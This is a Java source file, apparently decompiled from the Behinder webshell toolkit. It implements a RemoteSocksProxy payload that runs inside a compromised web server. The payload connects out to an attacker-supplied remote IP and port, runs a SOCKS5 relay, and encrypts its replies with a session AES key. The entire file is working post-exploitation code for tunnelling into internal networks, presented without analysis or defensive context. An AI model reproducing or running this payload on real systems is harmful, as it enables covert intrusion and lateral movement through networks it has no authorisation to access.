package net.rebeyond.behinder.payload.java;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.objectweb.asm.Opcodes;

public class RemoteSocksProxy implements Runnable {
    public static String action;
    public static String remoteIP;
    public static String remotePort;
    private Object Request;
    private Object Response;
    private Object Session;
    private int listenPort = 5555;
    private Map<String, Object> paramMap;
    private String threadType;

    public RemoteSocksProxy(String threadType2, Map<String, Object> paramMap2) {
        this.threadType = threadType2;
        this.paramMap = paramMap2;
    }

    public RemoteSocksProxy() {
    }

    public boolean equals(Object obj) {
        try {
            fillContext(obj);
            Map<String, String> result = new HashMap<>();
            try {
                Map<String, Object> paramMap2 = new HashMap<>();
                paramMap2.put("remoteIP", remoteIP);
                paramMap2.put("remotePort", remotePort);
                paramMap2.put("request", this.Request);
                paramMap2.put("response", this.Response);
                paramMap2.put("session", this.Session);
                String socksServerHash = "socks_server_" + this.listenPort;
                paramMap2.put("serverSocketHash", socksServerHash);
                if (action.equals("create")) {
                    try {
                        ServerSocket serverSocket = new ServerSocket(0, 50);
                        this.listenPort = serverSocket.getLocalPort();
                        paramMap2.put("listenPort", Integer.valueOf(this.listenPort));
                        sessionSetAttribute(this.Session, socksServerHash, serverSocket);
                        serverSocket.setReuseAddress(true);
                        new Thread(new RemoteSocksProxy("daemon", paramMap2)).start();
                        Thread.sleep(500);
                        new Thread(new RemoteSocksProxy("link", paramMap2)).start();
                        result.put("status", "success");
                        result.put("msg", "success");
                    } catch (Exception e) {
                        result.put("status", "fail");
                        result.put("msg", e.getMessage());
                    }
                } else if (action.equals("stop")) {
                    Enumeration keys = sessionGetAttributeNames(this.Session);
                    while (keys.hasMoreElements()) {
                        String key = keys.nextElement().toString();
                        if (key.startsWith("socks_")) {
                            Object socket = sessionGetAttribute(this.Session, key);
                            sessionRemoveAttribute(this.Session, key);
                            if (socket.getClass().getName().indexOf("SocketChannel") >= 0) {
                                try {
                                    ((SocketChannel) socket).close();
                                } catch (IOException e2) {
                                }
                            } else if (socket.getClass().getName().indexOf("ServerSocket") >= 0) {
                                try {
                                    ((ServerSocket) socket).close();
                                } catch (IOException e3) {
                                }
                            } else {
                                try {
                                    ((Socket) socket).close();
                                } catch (IOException e4) {
                                }
                            }
                        }
                    }
                    result.put("status", "success");
                    result.put("msg", "success");
                }
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                } catch (Exception e5) {
                    e5.printStackTrace();
                }
            } catch (Exception e6) {
                result.put("status", "fail");
                result.put("msg", e6.getMessage());
                try {
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                } catch (Exception e7) {
                    e7.printStackTrace();
                }
            } catch (Throwable th) {
                try {
                    Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                    so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                } catch (Exception e8) {
                    e8.printStackTrace();
                }
                throw th;
            }
            return true;
        } catch (Exception e9) {
            return true;
        }
    }

    public void run() {
        if (this.threadType.equals("daemon")) {
            Object session = this.paramMap.get("session");
            while (true) {
                try {
                    Socket serverInnersocket = ((ServerSocket) sessionGetAttribute(session, this.paramMap.get("serverSocketHash").toString())).accept();
                    String serverInnersocketHash = "socks_server_inner_" + serverInnersocket.getInetAddress().getHostAddress() + "_" + serverInnersocket.getPort();
                    this.paramMap.put("serverInnersocketHash", serverInnersocketHash);
                    sessionSetAttribute(session, serverInnersocketHash, serverInnersocket);
                    new Thread(new RemoteSocksProxy("session", this.paramMap)).start();
                } catch (Exception e) {
                    return;
                }
            }
        } else if (this.threadType.equals("link")) {
            try {
                Object session2 = this.paramMap.get("session");
                String remoteIP2 = this.paramMap.get("remoteIP").toString();
                int remotePort2 = Integer.parseInt(this.paramMap.get("remotePort").toString());
                int listenPort2 = Integer.parseInt(this.paramMap.get("listenPort").toString());
                SocketChannel outerSocketChannel = SocketChannel.open();
                outerSocketChannel.connect(new InetSocketAddress(remoteIP2, remotePort2));
                String outerSocketChannelHash = "socks_outer_" + outerSocketChannel.socket().getLocalPort() + "_" + remoteIP2 + "_" + remotePort2;
                sessionSetAttribute(session2, outerSocketChannelHash, outerSocketChannel);
                this.paramMap.put("outerSocketChannelHash", outerSocketChannelHash);
                SocketChannel innerSocketChannel = SocketChannel.open();
                innerSocketChannel.connect(new InetSocketAddress("127.0.0.1", listenPort2));
                String innerSocketChannelHash = "socks_inner_" + innerSocketChannel.socket().getLocalPort();
                sessionSetAttribute(session2, innerSocketChannelHash, innerSocketChannel);
                this.paramMap.put("innerSocketChannelHash", innerSocketChannelHash);
                new Thread(new RemoteSocksProxy("linkRead", this.paramMap)).start();
                new Thread(new RemoteSocksProxy("linkWrite", this.paramMap)).start();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        } else if (this.threadType.equals("linkRead")) {
            Object session3 = this.paramMap.get("session");
            SocketChannel outerSocketChannel2 = (SocketChannel) sessionGetAttribute(session3, this.paramMap.get("outerSocketChannelHash").toString());
            SocketChannel innerSocketChannel2 = (SocketChannel) sessionGetAttribute(session3, this.paramMap.get("innerSocketChannelHash").toString());
            while (true) {
                try {
                    ByteBuffer buf = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    OutputStream so = outerSocketChannel2.socket().getOutputStream();
                    for (int bytesRead = innerSocketChannel2.read(buf); bytesRead > 0; bytesRead = innerSocketChannel2.read(buf)) {
                        so.write(buf.array(), 0, bytesRead);
                        so.flush();
                        buf.clear();
                    }
                    so.flush();
                    so.close();
                } catch (IOException e3) {
                }
            }
        } else if (this.threadType.equals("linkWrite")) {
            Object session4 = this.paramMap.get("session");
            SocketChannel outerSocketChannel3 = (SocketChannel) sessionGetAttribute(session4, this.paramMap.get("outerSocketChannelHash").toString());
            SocketChannel innerSocketChannel3 = (SocketChannel) sessionGetAttribute(session4, this.paramMap.get("innerSocketChannelHash").toString());
            while (true) {
                try {
                    ByteBuffer buf2 = ByteBuffer.allocate(Opcodes.ACC_INTERFACE);
                    OutputStream so2 = innerSocketChannel3.socket().getOutputStream();
                    for (int bytesRead2 = outerSocketChannel3.read(buf2); bytesRead2 > 0; bytesRead2 = outerSocketChannel3.read(buf2)) {
                        so2.write(buf2.array(), 0, bytesRead2);
                        so2.flush();
                        buf2.clear();
                    }
                    so2.flush();
                    so2.close();
                } catch (IOException e4) {
                }
            }
        } else if (this.threadType.equals("session")) {
            try {
                if (handleSocks((Socket) sessionGetAttribute(this.paramMap.get("session"), this.paramMap.get("serverInnersocketHash").toString()))) {
                    new Thread(new RemoteSocksProxy("sessionWrite", this.paramMap)).start();
                    new Thread(new RemoteSocksProxy("sessionRead", this.paramMap)).start();
                    new Thread(new RemoteSocksProxy("link", this.paramMap)).start();
                }
            } catch (Exception e5) {
                e5.printStackTrace();
            }
        } else if (this.threadType.equals("sessionRead")) {
            Object session5 = this.paramMap.get("session");
            Socket serverInnersocket2 = (Socket) sessionGetAttribute(session5, this.paramMap.get("serverInnersocketHash").toString());
            Socket targetSocket = (Socket) sessionGetAttribute(session5, this.paramMap.get("targetSocketHash").toString());
            if (serverInnersocket2 != null) {
                try {
                    byte[] buf3 = new byte[Opcodes.ACC_INTERFACE];
                    for (int bytesRead3 = targetSocket.getInputStream().read(buf3); bytesRead3 > 0; bytesRead3 = targetSocket.getInputStream().read(buf3)) {
                        serverInnersocket2.getOutputStream().write(buf3, 0, bytesRead3);
                        serverInnersocket2.getOutputStream().flush();
                    }
                } catch (Exception e6) {
                    e6.printStackTrace();
                }
                try {
                    serverInnersocket2.close();
                    targetSocket.close();
                } catch (Exception e7) {
                    e7.printStackTrace();
                }
            }
        } else if (this.threadType.equals("sessionWrite")) {
            Object session6 = this.paramMap.get("session");
            Socket serverInnersocket3 = (Socket) sessionGetAttribute(session6, this.paramMap.get("serverInnersocketHash").toString());
            Socket targetSocket2 = (Socket) sessionGetAttribute(session6, this.paramMap.get("targetSocketHash").toString());
            if (serverInnersocket3 != null) {
                try {
                    byte[] buf4 = new byte[Opcodes.ACC_INTERFACE];
                    for (int bytesRead4 = serverInnersocket3.getInputStream().read(buf4); bytesRead4 > 0; bytesRead4 = serverInnersocket3.getInputStream().read(buf4)) {
                        targetSocket2.getOutputStream().write(buf4, 0, bytesRead4);
                        targetSocket2.getOutputStream().flush();
                    }
                } catch (Exception e8) {
                    e8.printStackTrace();
                }
                try {
                    serverInnersocket3.close();
                    targetSocket2.close();
                } catch (Exception e9) {
                    e9.printStackTrace();
                }
            }
        }
    }

    private boolean handleSocks(Socket socket) throws Exception {
        int ver = socket.getInputStream().read();
        if (ver == 5) {
            return parseSocks5(socket);
        }
        if (ver == 4) {
            return parseSocks4(socket);
        }
        return false;
    }

    private boolean parseSocks5(Socket socket) throws Exception {
        int cmd;
        int atyp;
        DataInputStream ins = new DataInputStream(socket.getInputStream());
        DataOutputStream os = new DataOutputStream(socket.getOutputStream());
        int nmethods = ins.read();
        for (int i = 0; i < nmethods; i++) {
            ins.read();
        }
        os.write(new byte[]{5, 0});
        if (ins.read() == 2) {
            ins.read();
            cmd = ins.read();
            ins.read();
            atyp = ins.read();
        } else {
            cmd = ins.read();
            ins.read();
            atyp = ins.read();
        }
        byte[] targetPort = new byte[2];
        String host = "";
        if (atyp == 1) {
            byte[] target = new byte[4];
            ins.readFully(target);
            ins.readFully(targetPort);
            String[] tempArray = new String[4];
            for (int i2 = 0; i2 < target.length; i2++) {
                tempArray[i2] = (target[i2] & 255) + "";
            }
            for (int i3 = 0; i3 < tempArray.length; i3++) {
                host = host + tempArray[i3] + ".";
            }
            host = host.substring(0, host.length() - 1);
        } else if (atyp == 3) {
            byte[] target2 = new byte[ins.read()];
            ins.readFully(target2);
            ins.readFully(targetPort);
            host = new String(target2);
        } else if (atyp == 4) {
            byte[] target3 = new byte[16];
            ins.readFully(target3);
            ins.readFully(targetPort);
            host = new String(target3);
        }
        int port = ((targetPort[0] & 255) * Opcodes.ACC_NATIVE) + (targetPort[1] & 255);
        if (cmd == 2 || cmd == 3) {
            throw new Exception("not implemented");
        } else if (cmd == 1) {
            String host2 = InetAddress.getByName(host).getHostAddress();
            try {
                Socket targetSocket = new Socket(host2, port);
                String targetSocketHash = "socks_target_" + targetSocket.getLocalPort() + "_" + host2 + "_" + port;
                this.paramMap.put("targetSocketHash", targetSocketHash);
                sessionSetAttribute(this.paramMap.get("session"), targetSocketHash, targetSocket);
                os.write(mergeByteArray(new byte[]{5, 0, 0, 1}, InetAddress.getByName(host2).getAddress(), targetPort));
                return true;
            } catch (Exception e) {
                os.write(mergeByteArray(new byte[]{5, 5, 0, 1}, InetAddress.getByName(host2).getAddress(), targetPort));
                throw new Exception(String.format("[%s:%d] Remote failed", host2, Integer.valueOf(port)));
            }
        } else {
            throw new Exception("Socks5 - Unknown CMD");
        }
    }

    private boolean parseSocks4(Socket socket) {
        return false;
    }

    public static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] != null) {
                totalLength += byteArray[i].length;
            }
        }
        byte[] result = new byte[totalLength];
        int cur = 0;
        for (int i2 = 0; i2 < byteArray.length; i2++) {
            if (byteArray[i2] != null) {
                System.arraycopy(byteArray[i2], 0, result, cur, byteArray[i2].length);
                cur += byteArray[i2].length;
            }
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private static String base64encode(String content) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            Class Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content.getBytes("UTF-8"));
        }
        Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
        return ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                value = base64encode(value);
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }

    private Enumeration sessionGetAttributeNames(Object session) {
        try {
            return (Enumeration) session.getClass().getMethod("getAttributeNames", new Class[0]).invoke(session, new Object[0]);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionRemoveAttribute(Object session, String key) {
        try {
            session.getClass().getMethod("removeAttribute", new Class[0]).invoke(session, key);
        } catch (Exception e) {
        }
    }
}
